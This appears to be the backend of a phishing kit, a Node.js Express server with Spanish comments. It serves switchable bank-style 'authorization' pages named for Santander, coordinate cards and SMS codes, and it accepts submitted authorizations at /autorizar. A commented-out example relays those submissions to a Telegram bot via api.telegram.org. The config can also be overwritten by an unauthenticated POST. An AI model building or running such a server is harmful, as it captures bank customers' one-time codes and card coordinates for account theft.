const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Endpoint para leer configuración
app.get("/config", (req, res) => {
  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
  res.json(cfg);
});

// Endpoint para guardar configuración
app.post("/config", (req, res) => {
  fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
  res.json(req.body);
});

// Endpoint de autorización dinámico
app.get("/autorizacion", (req, res) => {
  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));

  if(cfg.tipoAutorizacion === "santander"){
    res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
    return;
  }

  if(cfg.tipoAutorizacion === "coordenadas"){
    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
    return;
  }

  if(cfg.tipoAutorizacion === "sms"){
    res.sendFile(path.join(__dirname, "public", "autorizacion-sms.html"));
    return;
  }

  // Valor por defecto
  res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
});

// Endpoint para recibir autorizaciones y reenviar a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    // Aquí envías a Telegram usando tu token y chat_id
    // Ejemplo:
    // await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
    //   method: "POST",
    //   headers: { "Content-Type": "application/json" },
    //   body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
    // });

    res.json({ status: "ok", mensaje });
  } catch (err) {
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Servir index.html por defecto
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
